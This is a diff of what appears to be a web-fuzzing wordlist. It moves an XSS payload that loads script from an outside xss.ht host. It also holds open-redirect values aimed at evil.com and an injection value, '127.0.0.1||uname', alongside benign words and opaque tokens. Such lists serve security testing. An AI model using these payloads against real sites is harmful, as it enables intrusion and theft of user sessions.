@@ -1,3 +1,7 @@
+1"'<!--></Script/><Svg /OnLoad=appendChild(createElement(`Script`)).src=`https://ragnarokv.xss.ht`></i>
+xml
+json
+geolocation
 ///www.x.com@evil.com/
 //google.com?
 ////google%E3%80%82com
@@ -11,5 +15,14 @@ false
 NULL
 127.0.0.1||uname
 1
-1"'<!--></Script/><Svg /OnLoad=appendChild(createElement(`Script`)).src=`https://ragnarokv.xss.ht`></i>
-
+head
+put
+delete
+4.8.7
+openid
+offline
+/careers/
+update
+doubleclick
+CjwKCAiA0O7fBRASEiwAYI9QAifkeDmlmL4lI5TcgfqhhiSe5pM4S9ztx5aywvxH8v1m1PhOpsZgphoCh8wQAvD_BwE
+hlDOKwpzjPadqEkmmR1nhTrzunxgQ2QtzxbqJmXoIUMhmblH4cZGb1EgOAxrdkh5cQSRwwqHbPv4trcFuWpecw==
